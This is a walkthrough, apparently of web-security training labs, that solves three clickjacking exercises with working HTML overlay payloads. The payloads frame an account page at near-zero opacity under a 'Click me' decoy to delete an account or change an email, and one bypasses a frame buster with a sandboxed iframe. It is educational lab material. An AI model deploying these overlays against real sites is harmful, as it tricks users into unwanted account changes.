# Clickjacking

## Basics

### Basic clickjacking with CSRF token protection

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website. To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted. You can log in to your own account using the following credentials: `wiener:peter`

_Note: The victim will be using Chrome so test your exploit on that browser._

----

1. Log in and view `my_account`:

![Clickjacking](../../_static/images/clickjacking1.png)

```html
<div id="account-content">
    <p>Your username is: wiener</p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required="" type="email" name="email" value="">
        <input required="" type="hidden" name="csrf" value="O4MwyJB2zDsba2zSUiNUP2mIOXyxqsjd">
        <button class="button" type="submit"> Update email </button>
    </form>
    <form id="delete-account-form" action="/my-account/delete" method="POST">
        <input required="" type="hidden" name="csrf" value="O4MwyJB2zDsba2zSUiNUP2mIOXyxqsjd">
        <button class="button" type="submit">Delete account</button>
    </form>
</div>
```

2. Create payload:
* The iframe `src` URL points to the target website vulnerable page. In this case, the page containing the "Update email" form, and depends on the unique lab-ID.
* An initial opacity of 0.1 to align the iframe actions and adjust the position values.
* Initial `top` and `left` values of resp `300px` and `60px`, to align the "Delete account" button with the "Test me" decoy action.

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```

3. Go to the exploit server and paste the payload into the `body` field of the form.
4. Click **Store** and then **View exploit**. Hover over "Test me" to make sure the cursor changes to a hand indicating that the `div` element is positioned correctly. If it is not, change the position of the `div` element by modifying the `top` and `left` properties of the style sheet.
5. Change "Test me" to "Click me", set `opacity` to `0.0001`, and click **Store**.

![Clickjacking](../../_static/images/clickjacking2.png)

6. And **Deliver exploit to victim**

### Clickjacking with form input data prefilled from a URL parameter

This lab extends the above `Basic clickjacking with CSRF token protection` lab. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button. To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed. You can log in to your own account using the following credentials: `wiener:peter`

_Note: The victim will be using Chrome so test your exploit on that browser._

----

1. Log in to the account on the target website.
2. Create payload:
* The iframe `src` URL points to the target website vulnerable page. In this case, the page containing the "Update email" form, and depends on the unique lab-ID.
* An initial opacity of 0.1 to align the iframe actions and adjust the position values.
* Initial `top` and `left` values of resp `400px` and `80px` - to align the "Update email" button with the "Test me" decoy action.

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

3. Go to the exploit server and paste the payload into the `body` field of the form.
4. Click **Store** and then **View exploit**. Hover over "Test me" to make sure the cursor changes to a hand indicating that the `div` element is positioned correctly. If it is not, change the position of the `div` element by modifying the `top` and `left` properties of the style sheet.
5. Change "Test me" to "Click me", set `opacity` to `0.0001`, and click **Store**.

![Clickjacking](../../_static/images/clickjacking3.png)

6. And **Deliver exploit to victim**

### Clickjacking with a frame buster script

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address? To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed. You can log in to your own account using the following credentials: `wiener:peter`.

_Note: The victim will be using Chrome so test your exploit on that browser._

----

1. Log in to the account on the target website.
2. Create payload:

* The iframe `src` URL points to the target website vulnerable page. In this case, the page containing the "Update email" form, and depends on the unique lab-ID.
* An initial opacity of 0.1 to align the iframe actions and adjust the position values.
* Initial `top` and `left` values of resp `385px` and `80px` - to align the "Update email" button with the "Test me" decoy action.

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 385px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

3. Go to the exploit server and paste the payload into the `body` field of the form.
4. Click **Store** and then **View exploit**. Hover over "Test me" to make sure the cursor changes to a hand indicating that the `div` element is positioned correctly. If it is not, adjust the position of the div element by modifying the `top` and `left` properties of the style sheet. 
5. Change "Test me" to "Click me", set `opacity` to `0.0001`, and click **Store**.

![Clickjacking](../../_static/images/clickjacking4.png)

6. **Deliver exploit to victim**

## Practitioner

### Exploiting clickjacking vulnerability to trigger DOM-based XSS

### Multistep clickjacking